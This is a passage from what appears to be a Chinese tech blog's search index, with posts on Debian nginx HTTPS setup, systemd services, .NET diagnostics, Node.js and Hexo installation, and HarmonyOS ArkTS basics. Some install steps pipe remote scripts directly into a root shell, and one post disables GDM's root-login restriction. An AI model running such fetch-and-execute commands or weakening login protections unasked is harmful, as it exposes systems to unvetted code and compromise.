2&gt;&amp;1 &amp;echo &quot;Services started successfully at $&#123;current_time&#125;. 脚本说明：current_time&#x3D;$(date +”%Y-%m-%d_%H-%M-%S”) 用于生成当前时间的字符串。每个启动命令都包含 cd 到目标目录后运行程序，并将日志文件命名为包含时间戳的文件。使用 || exit 确保如果 cd 失败，脚本会中断。 2. 赋予脚本执行权限运行以下命令为脚本赋予可执行权限： 1chmod +x start_services.sh 3. 自动化执行使用 systemd 配置服务如果需要在系统重启时自动启动，可以配置 systemd 服务文件： 创建服务文件在 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F; 目录下创建一个服务文件，比如 my_services.service： 12345678910111213ini[Unit]Description=Start Custom ServicesAfter=network.target[Service]Type=simpleExecStart=/path/to/start_services.shRestart=on-failure[Install]WantedBy=multi-user.target 启动并启用服务 123sudo systemctl daemon-reloadsudo systemctl start my_services.servicesudo systemctl enable my_services.service 以上步骤可以满足你在重启服务器时自动启动程序的需求。推荐使用 systemd 方法服务管理方式，提供了监控和自动重启功能。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"},{"name":"AOT","slug":"AOT","permalink":"https://banjinmei.github.io/tags/AOT/"}],"author":"mu"},{"title":"Debian nginx https","slug":"Debian-Nginx","date":"2024-05-07T11:13:24.000Z","updated":"2024-11-19T15:18:39.252Z","comments":true,"path":"2024/05/07/Debian-Nginx/","permalink":"https://banjinmei.github.io/2024/05/07/Debian-Nginx/","excerpt":"","text":"debian安装 nginx在Debian系统上安装Nginx，你可以按照以下步骤操作： sudo: command not found apt-get install sudo 首先，更新你的包索引： sudo apt update接下来，安装Nginx： sudo apt install nginx 安装完成后，启动Nginx服务： sudo systemctl start nginx（可选）设置Nginx开机自启动： sudo systemctl enable nginx你可以通过运行以下命令来检查Nginx的状态： sudo systemctl status nginx现在，你可以在Web浏览器中输入你服务器的IP地址或域名来访问默认的Nginx欢迎页面。如果你是在本地安装的Nginx，你可以通过访问 http://localhost 来查看这个页面。 如果你需要配置Nginx，你可以编辑 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf 文件或者在 &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F; 目录下创建或编辑配置文件，并使用 sudo ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;your-config &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F; 命令来启用它。 sudo whereis nginxNginx 默认安装位置配置文件所在目录 &#x2F;etc&#x2F; nginx配置 检测Nginx配置文件是否正确 nginx -t 重载Nginx配置nginx -s reload 自定义Nginx站点配置文件存放目录&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F; nginx网站目录&#x2F;var&#x2F;www&#x2F; 域名证书 阿里云证书免费证书https://help.aliyun.com/zh/ssl-certificate/user-guide/overview-of-free-certificates-overview-of-free-certificateshttps://yundun.console.aliyun.com/?p=cas#/certExtend/free/cn-hangzhou 服务器类型NginxTomcatApachelsJKS其他 根证书下载证书格式pem&#x2F;keypfxcrt&#x2F;keypfxjkspem&#x2F;keycrt&#x2F;cer Nginx部署https://help.aliyun.com/zh/ssl-certificate/user-guide/install-ssl-certificates-on-nginx-servers-or-tengine-servers? ls &#x2F;root&#x2F;cerf&#x2F;www.dtso.net.pem nginx -s reload #重新载入配置文件。说明报错the “ssl” parameter requires ngx_http_ssl_module：您需要重新编译Nginx并在编译安装的时候加上–with-http_ssl_module配置。 报错”&#x2F;cert&#x2F;3970497_demo.aliyundoc.com.pem”:BIO_new_file() failed (SSL: error:02001002:system library:fopen:No such file or directory:fopen(‘&#x2F;cert&#x2F;3970497_demo.aliyundoc.com.pem’,’r’) error:2006D080:BIO routines:BIO_new_file:no such file)：您需要去掉证书相对路径最前面的&#x2F;。例如，您需要去掉&#x2F;cert&#x2F;cert-file-name.pem最前面的&#x2F;，使用正确的相对路径cert&#x2F;cert-file-name.pem。 nginx -s reload 域名443安全组 防火墙开启~ 443 443 443 .conf 示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950server &#123; listen 443 ssl http2; listen [::]:443 ssl http2; server_name www.x.com; ssl_certificate /root/cerf/www.x.com.pem; ssl_certificate_key /root/cerf/www.x.com.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; # HSTS (optional) add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot;; # SSL session cache (optional) ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; # SSL stapling (optional, if you use OCSP) # ssl_stapling on; # ssl_stapling_verify on; # DH param is dependent on certificate size #ssl_dhparam /path/to/dhparam.pem; location / &#123; root /usr/share/nginx/html; index index.html index.htm; &#125; # other locations... # Redirect non-https to https # server &#123; # listen 80; # server_name your.domain.com; # return 301 https://$host$request_uri; # &#125; # Error handling error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; &#125; 网络测试 https://boce.aliyun.com/detect/dns debian 卸载 nginx在Debian系统中，要卸载nginx，你可以使用apt-get命令。以下是具体步骤： 首先，你需要知道nginx是否是通过apt安装的。你可以使用以下命令查看已安装的nginx包： dpkg -l | grep nginx如果nginx是通过apt安装的，你可以使用apt-get命令来卸载它： sudo apt-get remove nginx nginx-common这将会卸载nginx及其配置文件。 为了清除所有nginx的配置文件和依赖，你可以执行： sudo apt-get purge nginx nginx-common最后，你可以运行以下命令来清除无用的包和依赖： sudo apt-get autoremove确保在执行这些步骤之前，你已经停止了nginx服务： sudo systemctl stop nginx如果nginx是通过其他方式安装的，比如编译安装，那么你需要手动删除nginx或者按照其安装方式来卸载。 常用的Nginx管理工具： Nginx UI项目地址: GitHub - Nginx UIhttps://github.com/0xJacky/nginx-ui主要特点: 简化配置: 通过图形化界面简化Nginx的配置过程。实时监控: 显示Nginx服务器的关键指标，如连接数、请求处理时间等。易于扩展: 支持插件系统，用户可以根据需求安装额外的功能模块。高效管理: 集中管理多个Nginx实例。安全性: 提供多种认证机制，确保数据的安全传输。兼容性: 支持Docker等容器化平台。 bash &lt;(curl -L -s https://raw.githubusercontent.com/0xJacky/nginx-ui/master/install.sh) install systemctl start nginx-ui systemctl stop nginx-ui Nginx Proxy Manager项目地址: GitHub - Nginx Proxy Managerhttps://github.com/NginxProxyManager/nginx-proxy-manager官方网站: Nginx Proxy Manager 主要特点: 美观和安全的管理界面: 提供直观的用户界面，方便管理和配置。轻松创建转发和重定向: 支持自定义SSL证书。高级Nginx配置: 提供高级配置选项。用户管理权限和审计日志: 支持多用户管理和日志记录。Docker支持: 提供预构建的Docker镜像，方便部署","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":".NET获取内存","slug":"NET-Memory","date":"2024-05-06T06:57:24.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/05/06/NET-Memory/","permalink":"https://banjinmei.github.io/2024/05/06/NET-Memory/","excerpt":"","text":"在.NET 控制台应用程序中，你可以使用System.Diagnostics命名空间下的Process类来获取当前进程的内存使用情况。以下是一个简单的示例代码，展示如何获取并显示当前进程的内存使用量： 123456789101112131415161718192021222324using System;using System.Diagnostics; namespace DisplayProcessMemory&#123; class Program &#123; static void Main(string[] args) &#123; // 获取当前进程 Process currentProcess = Process.GetCurrentProcess(); // 使用需要的内存量 long workingSet64 = currentProcess.WorkingSet64; // 显示内存使用量 Console.WriteLine($&quot;当前进程占用内存: &#123;workingSet64&#125; 字节&quot;); // 单位转换为兆字节 double memoryInMB = workingSet64 / 1024.0 / 1024.0; Console.WriteLine($&quot;当前进程占用内存: &#123;memoryInMB.ToString(&quot;F2&quot;)&#125; MB&quot;); &#125; &#125;&#125; 在.NET中，可以使用System.Diagnostics命名空间下的Process类来获取当前进程的信息，但是直接获取网络带宽使用情况不是Process类提供的功能。你可以使用System.Net.NetworkInformation命名空间下的IPGlobalProperties类来获取网络接口的信息，然后累计所有网络接口的传输数据量来估算带宽使用。 以下是一个简单的示例代码，用于显示当前进程的网络传输数据量（发送和接收）： 1234567891011121314151617181920212223242526using System;using System.Diagnostics;using System.Net.NetworkInformation; class Program&#123; static void Main() &#123; Process currentProcess = Process.GetCurrentProcess(); Console.WriteLine($&quot;Process ID: &#123;currentProcess.Id&#125;&quot;); IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties(); TcpStatistics tcpStats = ipProperties.GetTcpIPv4Statistics(); Console.WriteLine($&quot;Total bytes received: &#123;tcpStats.BytesReceived&#125;&quot;); Console.WriteLine($&quot;Total bytes sent: &#123;tcpStats.BytesSent&#125;&quot;); // 输出网络接口统计信息 NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces(); foreach (NetworkInterface networkInterface in networkInterfaces) &#123; Console.WriteLine($&quot;Interface: &#123;networkInterface.Name&#125;&quot;); Console.WriteLine($&quot;Bytes received: &#123;networkInterface.GetIPv4Statistics().BytesReceived&#125;&quot;); Console.WriteLine($&quot;Bytes sent: &#123;networkInterface.GetIPv4Statistics().BytesSent&#125;&quot;); &#125; &#125;&#125; 请注意，这个示例显示的是从系统启动以来累计的网络接口数据量。如果你需要监测特定时间段内的带宽使用情况，你需要定期获取数据并计算差值。另外，这个示例仅包括了IPv4的数据，如果需要IPv6或者更多细节，请相应地扩展代码。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"}],"author":"mu"},{"title":"Debian Nodejs HEXO","slug":"Debian-hexo","date":"2024-05-03T09:02:53.000Z","updated":"2024-06-01T02:27:02.000Z","comments":true,"path":"2024/05/03/Debian-hexo/","permalink":"https://banjinmei.github.io/2024/05/03/Debian-hexo/","excerpt":"","text":"Debian Nodejs HEXO 安装Node.js环境1sudo apt update debian安装最新node v20.12.0在Debian系统上安装特定版本的Node.js（例如v20.12.0），你可以使用NodeSource二进制分发。以下是安装v20.12.0的步骤： 首先，打开终端。 使用curl下载NodeSource的安装脚本： 1curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 安装Node.js： 1sudo apt-get install -y nodejs 验证Node.js是否安装成功： 1node --version 如果你想要确保安装了特定的v20.12.0版本，可以在安装完Node.js后运行以下命令来验证版本： 1node -v 如果显示的版本号是v20.12.0，则表示已经成功安装了该版本。 安装HEXO使用npm包管理器，直接安装hexo 1npm install hexo -g 1hexo init blog 1cd blog 1npm install 1hexo server hexo 修改端口号_config.yml # 或者使用 vim _config.yml Docs: https://hexo.io/docs/server.html1234server: port: 12311 # 修改这里为你想要的端口号 compress: true header: true 1hexo s","categories":[],"tags":[]},{"title":".NET netty proto","slug":"NET-netty-proto","date":"2024-05-02T18:09:32.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/05/03/NET-netty-proto/","permalink":"https://banjinmei.github.io/2024/05/03/NET-netty-proto/","excerpt":"","text":"DotNetty是微软的Azure团队，使用C#实现的Netty的版本发布。不但使用了C#和.Net平台的技术特点，并且保留了Netty原来绝大部分的编程接口。让我们在使用时，完全可以依照Netty官方的教程来学习和使用DotNetty应用程序。 Netty 是一个异步事件驱动的网络应用程序框架，用于快速开发可维护的高性能协议服务器和客户端。 优点关注点分离——业务和网络逻辑解耦；模块化和可复用性；可测试性作为首要的要求历史阻塞Socket通信特点： 建立连接要阻塞线程，读取数据要阻塞线程如果要管理多个客户端，就需要为每个客户端建立不同的线程会有大量的线程在休眠状态，等待接收数据，资源浪费每个线程都要占用系统资源线程的切换很耗费系统资源非阻塞Socket（NIO）特点：每个Socket如果需要读写操作，都通过事件通知的方式通知选择器，这样就实现了一个线程管理多个Socket的目的。​ 选择器甚至可以在所有的Socket空闲的时候允许线程先去干别的事情减少了线程数量导致的资源占用，减少了线程切换导致的资源消耗 Protobufwakeng","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET 检测地址/主机/域名是否正常","slug":"NET-IP-Host","date":"2024-04-28T11:09:40.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/28/NET-IP-Host/","permalink":"https://banjinmei.github.io/2024/04/28/NET-IP-Host/","excerpt":"","text":"🌱PING 地址&#x2F;主机名&#x2F;域名 12345678910111213141516171819202122232425/// &lt;summary&gt;/// PING/// &lt;/summary&gt;/// &lt;param name=&quot;ip&quot;&gt;ip&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static bool PingIp(string ip)&#123; System.Net.NetworkInformation.Ping p = new System.Net.NetworkInformation.Ping(); System.Net.NetworkInformation.PingOptions options = new System.Net.NetworkInformation.PingOptions(); options.DontFragment = true; string data = &quot;Test Data!&quot;; byte[] buffer = Encoding.ASCII.GetBytes(data); int timeout = 2000; // Timeout System.Net.NetworkInformation.PingReply reply = p.Send(ip, timeout, buffer, options); if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) &#123; // AddToConvo(ip + reply.Status); return true; &#125; else &#123; // AddToConvo(ip + reply.Status); return false; &#125;&#125; 👀调用方法 123456789101112List&lt;string&gt; list = new List&lt;string&gt;();list.Add(&quot;192.168.1.1&quot;);list.Add(&quot;192.168.3.1&quot;);list.Add(&quot;192.168.4.1&quot;);foreach (string s in list)&#123; Console.WriteLine(s+&quot; &quot;+ ccPing.PingIp(s)); //if(!xxx) &#125;Thread.Sleep(10000); ​ 隔10秒自动调用1次 📫检查URL 12345678910111213141516171819202122public async Task&lt;bool&gt; IsServerRespondingAsync(string url, TimeSpan timeout)&#123; try &#123; using (var cancellationTokenSource = new System.Threading.CancellationTokenSource()) &#123; cancellationTokenSource.CancelAfter(timeout); var response = await _httpClient.GetAsync(url, cancellationTokenSource.Token); return response.IsSuccessStatusCode; &#125; &#125; catch (TaskCanceledException) &#123; // 请求超时 return false; &#125; catch (Exception) &#123; // 发生其他错误 return false; &#125;&#125; ⚡异步调用 1await checker.IsServerRespondingAsync(url, TimeSpan.FromSeconds(2)); 如果False可以调用报警代码 END ​","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"spider","slug":"spider","permalink":"https://banjinmei.github.io/tags/spider/"}],"author":"mu"},{"title":".NET Avalonia Linux ","slug":"NET-Avalonia","date":"2024-04-26T16:07:15.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/27/NET-Avalonia/","permalink":"https://banjinmei.github.io/2024/04/27/NET-Avalonia/","excerpt":"","text":"环境WIN10 VS2022 debian 👻前言Avalonia 是一个用于创建跨平台用户界面 (UI) 的开源框架。它是一个基于 .NET 平台的框架，允许开发者使用 XAML 和 C#（F#）来构建跨平台的应用程序。Avalonia 的目标是提供与 Windows Presentation Foundation (WPF) 类似的开发体验，但能够在 Windows、macOS 和 Linux 等多个平台上运行。 使用 Avalonia，开发者可以创建各种类型的应用程序，包括桌面应用、移动应用和嵌入式应用。一些可以通过 Avalonia 实现的功能和应用包括： 桌面应用程序：如办公软件、IDE、游戏客户端等。 移动应用程序：通过 Avalonia 可以构建支持多个平台的移动应用，如 Windows、macOS 和 Linux 上的移动应用。 跨平台工具：Avalonia 可以用于构建跨平台的开发工具、实用工具等。 游戏开发：Avalonia 也可以用于构建游戏的用户界面，适合基于 .NET 平台的游戏开发。 Avalonia 提供了一个强大的工具集，使开发者能够创建具有各种功能和样式的跨平台应用程序。 💻安装Avalonia选择管理拓展，点击下载，安装 ​ ​ 📦创建项目​ ​ ​ 编码… 📚在win下运行​ 查看linux内核 uname -a ​ 🔑打包发布复制到linux 授予权限 📻在linux下运行迁移Socket发布到linux​ ​ 实现win linux web 基于socket实时聊天","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Avalonia","slug":"Avalonia","permalink":"https://banjinmei.github.io/tags/Avalonia/"}],"author":"mu"},{"title":"Debian Gnome-Desktop GUI ","slug":"Debian-Gnome-Desktop-GUI","date":"2024-04-26T15:19:27.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/26/Debian-Gnome-Desktop-GUI/","permalink":"https://banjinmei.github.io/2024/04/26/Debian-Gnome-Desktop-GUI/","excerpt":"","text":"debian gnome-desktop 🌞更新1234sudo apt update[2024042601]sudo apt -y upgrade ​ 🎨安装1sudo apt -y install task-gnome-desktop 这个过程比较久 ​ 🍎分配123456sudo systemctl set-default graphical.targetvi /etc/pam.d/gdm-password``` bash注释 auth required pam_succeed_if.so user != root quiet_success``` bash#auth required pam_succeed_if.so user != root quiet_success 🛋️重启1sudo reboot 🔑通过VNC连接​ 配置后 ​","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"}],"author":"mu"},{"title":"HarmonyOS开发环境搭建 移动开发 鸿蒙开发 ArkTS","slug":"HarmonyOS-Base","date":"2024-04-21T05:00:43.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/21/HarmonyOS-Base/","permalink":"https://banjinmei.github.io/2024/04/21/HarmonyOS-Base/","excerpt":"","text":"💡 环境搭建HarmonyOS开发环境搭建 DevEco Studio安装https://developer.huawei.com/consumer/cn/deveco-studio/ ​ 🚀安装nodejs​ 🤵安装ohpm​ 🍔安装SDK​ ​ 💥Emulator安装​ Q:The graphic card OpenGL version is too old for Previewer to work.. 解决方法分两步： 1、下载enGL库：https://github.com/pal1000/mesa-dist-win/releases/download/23.1.1/mesa3d-23.1.1-release-msvc.7z 2、解压下载的zip文件,双击执行systemwidedeploy.cmd文件，然后按任意键，出现一个菜单，选择1，然后开始安装OpenGL驱动，出现complete 后关闭终端，重新运行程序即可生效。 🌶️新建ArkTs项目​ ​ ​ entry：HarmonyOS工程模块，编译构建生成一个HAP包。 src &gt; main &gt; ets：用于存放ets源码。src &gt; main &gt; ets &gt; MainAbility：应用&#x2F;服务的入口。src &gt; main &gt; ets &gt; MainAbility &gt; pages：MainAbility包含的页面。src &gt; main &gt; ets &gt; MainAbility &gt; pages &gt; index.ets：pages列表中的第一个页面，即应用的首页入口。src &gt; main &gt; ets &gt; MainAbility &gt; app.ets：承载Ability生命周期。src &gt; main &gt; resources：用于存放应用&#x2F;服务所用到的资源文件，如图形、多媒体、字符串、布局文件等。src &gt; main &gt; config.json：模块配置文件。主要包含HAP包的配置信息、应用&#x2F;服务在具体设备上的配置信息以及应用&#x2F;服务的全局配置信息。build-profile.json5：当前的模块信息、编译信息配置项，包括buildOption、targets配置等。其中targets中可配置当前运行环境，默认为HarmonyOS。hvigorfile.ts：模块级编译构建任务脚本，开发者可以自定义相关任务和代码实现。build-profile.json5：应用级配置信息，包括签名、产品配置等。 hvigorfile.ts：应用级编译构建任务脚本。 ​ 🏆️ArkTS语言ArkTS是HarmonyOS优选的主力应用开发语言。 ArkTS围绕应用开发在TypeScript（简称TS）生态基础上做了进一步扩展，继承了TS的所有特性，是TS的超集。因此，在学习ArkTS语言之前，建议开发者具备TS语言开发能力。 基本语法：ArkTS定义了声明式UI描述、自定义组件和动态扩展UI元素的能力，再配合ArkUI开发框架中的系统组件及其相关的事件方法、属性方法等共同构成了UI开发的主体。状态管理：ArkTS提供了多维度的状态管理机制。在UI开发框架中，与UI相关联的数据可以在组件内使用，也可以在不同组件层级间传递，比如父子组件之间、爷孙组件之间，还可以在应用全局范围内传递或跨设备传递。另外，从数据的传递形式来看，可分为只读的单向传递和可变更的双向传递。开发者可以灵活地利用这些能力来实现数据和UI的联动。渲染控制：ArkTS提供了渲染控制的能力。条件渲染可根据应用的不同状态，渲染对应状态下的UI内容。循环渲染可从数据源中迭代获取数据，并在每次迭代过程中创建相应的组件。数据懒加载从数据源中按需迭代数据，并在每次迭代过程中创建相应的组件。未来，ArkTS会结合应用开发&#x2F;运行的需求持续演进，逐步提供并行和并发能力增强、系统类型增强、分布式开发范式等更多特性。 ✨️基本语法基本语法概述在初步了解了ArkTS语言之后，我们以一个具体的示例来说明ArkTS的基本组成。装饰器： 用于装饰类、结构、方法以及变量，并赋予其特殊的含义。如上述示例中@Entry、@Component和@State都是装饰器，@Component表示自定义组件，@Entry表示该自定义组件为入口组件，@State表示组件中的状态变量，状态变量变化会触发UI刷新。UI描述：以声明式的方式来描述UI的结构，例如build()方法中的代码块。自定义组件：可复用的UI单元，可组合其他组件，如上述被@Component装饰的struct Hello。系统组件：ArkUI框架中默认内置的基础和容器组件，可直接被开发者调用，比如示例中的Column、Text、Divider、Button。属性方法：组件可以通过链式调用配置多项属性，如fontSize()、width()、height()、backgroundColor()等。事件方法：组件可以通过链式调用设置多个事件的响应逻辑，如跟随在Button后面的onClick()。系统组件、属性方法、事件方法具体使用可参考基于ArkTS的声明式开发范式。除此之外，ArkTS扩展了多种语法范式来使开发更加便捷： @Builder&#x2F;@BuilderParam：特殊的封装UI描述的方法，细粒度的封装和复用UI描述。@Extend&#x2F;@Styles：扩展内置组件和封装属性样式，更灵活地组合内置组件。stateStyles：多态样式，可以依据组件的内部状态的不同，设置不同样式。 🥇 声明式UI描述ArkTS以声明方式组合和扩展组件来描述应用程序的UI，同时还提供了基本的属性、事件和子组件配置方法，帮助我们实现应用交互逻辑。创建组件根据组件构造方法的不同，创建组件包含有参数和无参数两种方式。无参数如果组件的接口定义没有包含必选构造参数，则组件后面的“()”不需要配置任何内容。例如，Divider组件不包含构造参数 12345Column() &#123; Text(&#x27;item 1&#x27;) Divider() Text(&#x27;item 2&#x27;)&#125; 有参数如果组件的接口定义包含构造参数，则在组件后面的“()”配置相应参数。Image组件的必选参数src。 1Image(&#x27;https://xyz/test.jpg&#x27;) Text组件的非必选参数content。 123456// string类型的参数Text(&#x27;test&#x27;)// $r形式引入应用资源，可应用于多语言场景Text($r(&#x27;app.string.title_value&#x27;))// 无参数形式Text() 变量或表达式也可以用于参数赋值，其中表达式返回的结果类型必须满足参数类型要求。例如，设置变量或表达式来构造Image和Text组件的参数。 123Image(this.imagePath)Image(&#x27;https://&#x27; + this.imageUrl)Text(`count: $&#123;this.count&#125;`) 配置属性属性方法以“.”链式调用的方式配置系统组件的样式和其他属性，建议每个属性方法单独写一行。配置Text组件的字体大小。 12Text(&#x27;test&#x27;).fontSize(12) 配置组件的多个属性。 1234Image(&#x27;test.jpg&#x27;).alt(&#x27;error.jpg&#x27;).width(100).height(100) 除了直接传递常量参数外，还可以传递变量或表达式。 12345Text(&#x27;hello&#x27;).fontSize(this.size)Image(&#x27;test.jpg&#x27;).width(this.count % 2 === 0 ? 100 : 200).height(this.offset + 100) 对于系统组件，ArkUI还为其属性预定义了一些枚举类型供开发者调用，枚举类型可以作为参数传递，但必须满足参数类型要求。例如，可以按以下方式配置Text组件的颜色和字体样式。 12345Text(&#x27;hello&#x27;).fontSize(20).fontColor(Color.Red).fontWeight(FontWeight.Bold) 配置事件事件方法以“.”链式调用的方式配置系统组件支持的事件，建议每个事件方法单独写一行。使用箭头函数配置组件的事件方法。 12345Button(&#x27;Click me&#x27;).onClick(() =&gt; &#123; this.myText = &#x27;ArkUI&#x27;;&#125;) 使用匿名函数表达式配置组件的事件方法，要求使用bind，以确保函数体中的this指向当前组件。使用组件的成员函数配置组件的事件方法。 12345Button(&#x27;add counter&#x27;).onClick(function()&#123; this.counter += 2;&#125;.bind(this)) 使用声明的箭头函数，可以直接调用，不需要bind this。 配置子组件如果组件支持子组件配置，则需在尾随闭包”{…}”中为组件添加子组件的UI描述。Column、Row、Stack、Grid、List等组件都是容器组件。以下是简单的Column组件配置子组件的示例。 12345678Column() &#123; Text(&#x27;Hello&#x27;) .fontSize(100)Divider() Text(this.myText) .fontSize(100) .fontColor(Color.Red)&#125; 容器组件均支持子组件配置，可以实现相对复杂的多级嵌套。 123456789101112column() &#123; Row() &#123; Image(&#x27;test1.jpg&#x27;) .width(100) .height(100) Button(&#x27;click +1&#x27;) .onClick(() =&gt; &#123; console.info(&#x27;+1 clicked!&#x27;); &#125;) &#125;&#125; 🍱组件Row沿水平方向布局容器。可以包含子组件。 1Row(value?:&#123;space?: string | number&#125;) 参数： 参数名 参数类型 必填 默认值 参数描述 space string | number 否 0 横向布局元素间距。 属性： 名称 参数类型 默认值 描述 alignItems VerticalAlign VerticalAlign.Center 在垂直方向上子组件的对齐格式。 justifyContent FlexAlign FlexAlign.Start 设置子组件在水平方向上的对齐格式。 Column沿垂直方向布局的容器。可以包含子组件。 1Column(value?:&#123;space?: string | number&#125;) 参数： 参数名 参数类型 必填 默认值 参数描述 space string|number 否 0 纵向布局元素间距。 属性： 名称 参数类型 默认值 描述 alignItems HorizontalAlign HorizontalAlign.Center 设置子组件在水平方向上的对齐格式。 justifyContent8+ FlexAlign FlexAlign.Start 设置子组件在垂直方向上的对齐格式。 Flex以弹性方式布局子组件的容器组件。子组件 可以包含子组件。 12345Flex(value?: &#123; direction?: FlexDirection, wrap?: FlexWrap, justifyContent?: FlexAlign, alignItems?: ItemAlign, alignContent?: FlexAlign &#125;) 参数： 参数名 参数类型 必填 默认值 参数描述 direction FlexDirection 否 FlexDirection.Row 子组件在Flex容器上排列的方向，即主轴的方向。 wrap FlexWrap 否 FlexWrap.NoWrap Flex容器是单行/列还是多行/ 列排列。 justifyContent FlexAlign 否 FlexAlign.Start 子组件在Flex容器主轴上的对齐格式。 alignItems ItemAlign 否 ItemAlign.Stretch 子组件在Flex容器交叉轴上的对齐格式。 alignContent FlexAlign 否 FlexAlign.Start 交叉轴中有额外的空间时，多行内容的对齐方式。仅在 wrap为Wrap或 WrapReverse下生效。 List列表包含一系列相同宽度的列表项。适合连续、多行呈现同类数据，例如图片和文本。 1234List(value?:&#123;space?: number | string, initialIndex?: number, scroller?: Scroller&#125;) 参数： 参数名 参数类型 必填 参数描述 space number | string 否 列表项间距。默认值：0 initialIndex number 否 设置当前List初次加载时视口起始位置显示的item的索引值。如果设置的值超过了当前List后一个item的索引值，则设置不生效。默认值：0 scroller Scroller 否 可滚动组件的控制器。用于与可滚动组件进行绑定。 属性 名称 参数类型 描述 listDirection Axis 设置List组件排列方向参照Axis枚举说明。默认值：Vertical divider {strokeWidth: Length,color?: ResourceColor,startMargin?: Length,endMargin?: Length} | null 用于设置ListItem分割线样式，默认无分割线。strokeWidth: 分割线的线宽。 color: 分割线的颜色。startMargin： 分割线与列表侧边起始端的距离。 endMargin: 分割线与列表侧边结束端的距离。 scrollBar BarState 设置滚动条状态。默认值：BarState.Off cachedCount number 设置预加载的ListItem的数量。具体使用可参考减少应用白块说明。默认值：1 editMode boolean 声明当前List组件是否处于可编辑模式。 默认值：false edgeEffect EdgeEffect 滑动效果，目前支持的滑动效果参见 EdgeEffect的枚举说明。默认值： EdgeEffect.Spring chainAnimation boolean 用于设置当前list是否启用链式联动动效，开启后列表滑动以及顶部和底部拖拽时会有链式联动的效果。链式联动效果：list内的list-item间隔一定距离，在基本的滑动交互行为下，主动对象驱动从动对象进行联动，驱动效果遵循弹簧物理动效。- false：不启用链式联动。true：启用链式联动。默认值：false multiSelectable 8+ boolean 是否开启鼠标框选。&gt;默认值：falsefalse：关闭框选。- true：开启框选。 事件 名称 功能描述 onItemDelete(event: (index: number) =&gt; boolean) 列表项删除时触发。 onScroll(event: (scrollOffset: number, scrollState: ScrollState) =&gt; void) 列表滑动时触发，返回值scrollOffset为滑动偏移量， scrollState为当前滑动状态。 onScrollIndex(event: (start: number, end: number) =&gt; void) 列表滑动时触发，返回值分别为滑动起始位置索引值与滑动结束位置索引值。 onReachStart(event: () =&gt; void) 列表到达起始位置时触发。 onReachEnd(event: () =&gt; void) 列表到底末尾位置时触发。 onScrollStop(event: () =&gt; void) 列表滑动停止时触发。 onItemMove(event: (from: number, to: number) =&gt; boolean) 列表元素发生移动时触发，返回值from、to分别为移动前索引值与移动后索引值。 onItemDragStart(event: (event: ItemDragInfo, itemIndex: number) =&gt; ((() =&gt; any) | void)) 开始拖拽列表元素时触发，返回值event见ItemDragInfo对象说明，itemIndex为被拖拽列表元素索引值。 onItemDragEnter(event: (event: ItemDragInfo) =&gt; void) 拖拽进入列表元素范围内时触发，返回值event见 ItemDragInfo对象说明。 onItemDragMove(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number) =&gt; void) 拖拽在列表元素范围内移动时触发，返回值event见 ItemDragInfo对象说明，itemIndex为拖拽起始位置， insertIndex为拖拽插入位置。 onItemDragLeave(event: (event: ItemDragInfo, itemIndex: number) =&gt; void) 拖拽离开列表元素时触发，返回值event见ItemDragInfo对象说明，itemIndex为拖拽离开的列表元素索引值。 onItemDrop(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number, isSuccess: boolean) =&gt; void) 绑定该事件的列表元素可作为拖拽释放目标，当在列表元素 内停止拖拽时触发，返回值event见ItemDragInfo对象说明， itemIndex为拖拽起始位置，insertIndex为拖拽插入位置， isSuccess为是否成功释放。 ScrollState枚举说明 名称 描述 Idle 未滑动状态。 Scroll 惯性滑动状态。 Fling 手指拖动状态。 ListItem用来展示列表具体item，必须配合List来使用。 12ListItem(value?: string) 属性 名称 参数类型 默认值 描述 sticky 